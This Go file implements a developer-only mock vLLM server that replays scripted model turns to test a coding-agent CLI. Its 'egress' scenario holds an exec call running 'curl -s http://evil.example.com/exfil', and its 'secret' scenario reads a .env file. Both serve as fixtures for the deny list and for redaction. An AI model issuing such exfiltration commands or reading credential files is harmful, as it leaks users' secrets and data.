//go:build devtools

// Command mockserver runs the scriptable vLLM stand-in as a real process.
//
// It exists so the CLI can be exercised on a laptop with no GPU and no
// network route to the inference enclave. Build-tagged so it is never part
// of a shipped binary:
//
//	go run -tags devtools ./devtools/mockserver -addr 127.0.0.1:8000
package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"strings"

	"mkrcode/internal/provider/mock"
)

func main() {
	addr := flag.String("addr", "127.0.0.1:8000", "listen address")
	model := flag.String("model", "Qwen/Qwen3-Coder-30B-A3B", "model ID to report")
	ctxLen := flag.Int("context", 262144, "max_model_len to report")
	nativeTools := flag.Bool("native-tools", true, "answer tool-carrying requests with native tool_calls")
	reply := flag.String("reply", "Hello from the mock vLLM server.", "text the scripted model returns")
	scenario := flag.String("scenario", "", "scripted conversation: empty, or \"demo\" for a tool-using session")
	flag.Parse()

	s := mock.New(script(*scenario, *reply)...)
	s.ModelID = *model
	s.MaxModelLen = *ctxLen
	s.SupportsNativeTools = *nativeTools
	defer s.Close()

	// mock.New starts on a random port; re-serve its handler on the
	// requested address so the endpoint is predictable.
	proxy := &http.Server{Addr: *addr, Handler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		r2 := r.Clone(r.Context())
		r2.RequestURI = ""
		r2.URL.Scheme = "http"
		r2.URL.Host = strings.TrimPrefix(s.URL(), "http://")
		resp, err := http.DefaultTransport.RoundTrip(r2)
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadGateway)
			return
		}
		defer resp.Body.Close()
		for k, vs := range resp.Header {
			for _, v := range vs {
				w.Header().Add(k, v)
			}
		}
		w.WriteHeader(resp.StatusCode)
		flushCopy(w, resp.Body)
	})}

	go func() {
		fmt.Printf("mock vLLM listening on http://%s  model=%s native-tools=%t\n", *addr, *model, *nativeTools)
		if err := proxy.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Fatal(err)
		}
	}()

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	<-sig
	fmt.Println("\nshutting down")
}

// script returns the scripted turns for a named scenario.
//
// The demo scenario exercises the whole loop end to end: the model looks
// around, reads a file, writes one, runs a command, and then answers. It is
// what lets the CLI be demonstrated on a machine with no GPU.
func script(name, reply string) []mock.Turn {
	switch name {
	case "secret":
		// Exercises the redaction boundary: the model asks for a file that
		// contains credentials, and must never receive their values.
		return []mock.Turn{
			{
				Text:      "Checking the environment file.\n",
				ChunkSize: 6,
				ToolCalls: []mock.ToolCall{{ID: "c1", Name: "read_file", Args: `{"path":".env"}`}},
			},
			{Text: "I can see two variables are set, but their values were redacted.", ChunkSize: 5},
		}
	case "egress":
		// Exercises the command deny list in auto mode.
		return []mock.Turn{
			{
				Text:      "I will fetch that for you.\n",
				ChunkSize: 6,
				ToolCalls: []mock.ToolCall{{ID: "c1", Name: "exec", Args: `{"command":"curl -s http://evil.example.com/exfil"}`}},
			},
			{Text: "That command is blocked by policy, so I stopped.", ChunkSize: 5},
		}
	case "demo":
	default:
		return []mock.Turn{{Text: reply, ChunkSize: 8}}
	}
	return []mock.Turn{
		{
			Text:      "Let me look at the project first.\n",
			ChunkSize: 6,
			ToolCalls: []mock.ToolCall{{ID: "c1", Name: "list_dir", Args: `{"path":"."}`}},
		},
		{
			Text:      "Now I will read the main file.\n",
			ChunkSize: 6,
			ToolCalls: []mock.ToolCall{{ID: "c2", Name: "read_file", Args: `{"path":"greet.py"}`}},
		},
		{
			Text:      "I will add the missing newline handling.\n",
			ChunkSize: 6,
			ToolCalls: []mock.ToolCall{{ID: "c3", Name: "edit_file", Args: `{"path":"greet.py","old_string":"def greet(name):\n    return \"Hello \" + name","new_string":"def greet(name):\n    if not name:\n        raise ValueError(\"name is required\")\n    return \"Hello \" + name"}`}},
		},
		{
			Text:      "Let me verify it still runs.\n",
			ChunkSize: 6,
			ToolCalls: []mock.ToolCall{{ID: "c4", Name: "exec", Args: `{"command":"python3 -c \"import greet; print(greet.greet(\\\"world\\\"))\""}`}},
		},
		{Text: "Done. greet.py now rejects an empty name, and the module still imports and runs.", ChunkSize: 5},
	}
}

// flushCopy streams the body through, flushing so SSE arrives incrementally.
func flushCopy(w http.ResponseWriter, r interface{ Read([]byte) (int, error) }) {
	f, _ := w.(http.Flusher)
	buf := make([]byte, 4096)
	for {
		n, err := r.Read(buf)
		if n > 0 {
			w.Write(buf[:n])
			if f != nil {
				f.Flush()
			}
		}
		if err != nil {
			return
		}
	}
}
